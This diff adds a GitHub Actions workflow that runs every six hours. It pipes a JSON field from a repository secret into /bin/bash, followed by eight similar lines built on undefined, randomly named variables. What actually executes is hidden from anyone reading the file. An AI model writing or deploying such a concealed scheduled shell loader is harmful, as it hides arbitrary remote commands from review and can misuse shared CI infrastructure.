@@ -1,0 +1,26 @@
+name: zhaliangyy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaliangyy
+        env:
+          hfa97: ${{ secrets.hfa97 }}
+        run: |
+          echo $hfa97 | jq -r .ep01858 | /bin/bash
+          echo $j8451 | jq -r .qdga99 | /bin/bash
+          echo $x7 | jq -r .ks4 | /bin/bash
+          echo $rv819 | jq -r .x5384 | /bin/bash
+          echo $hsnhi4952 | jq -r .wdkn70 | /bin/bash
+          echo $xi46830 | jq -r .th416 | /bin/bash
+          echo $f1520 | jq -r .wfflh8924 | /bin/bash
+          echo $xchpr70896 | jq -r .io3636 | /bin/bash
+          echo $sucnt3 | jq -r .iv1 | /bin/bash
+
